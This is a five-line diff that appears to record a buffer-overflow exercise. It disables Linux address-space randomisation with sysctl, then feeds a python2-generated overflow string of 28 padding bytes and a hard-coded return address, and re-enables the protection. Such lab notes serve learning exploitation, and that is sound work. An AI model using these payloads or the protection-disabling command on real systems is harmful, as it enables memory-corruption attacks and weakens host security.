@@ -1,0 +1,5 @@
+sudo sysctl kernel.randomize_va_space=0
+$(python2 -c 'print ("a" * 28 + "\x78\x62\x55\x56")')
+$(python2 -c 'print ("a" * 28 + "\x78\x62\x55\x56")')
+sudo sysctl kernel.randomize_va_space=1
+$(python2 -c 'print ("a" * 28 + "\x78\x62\x55\x56")')
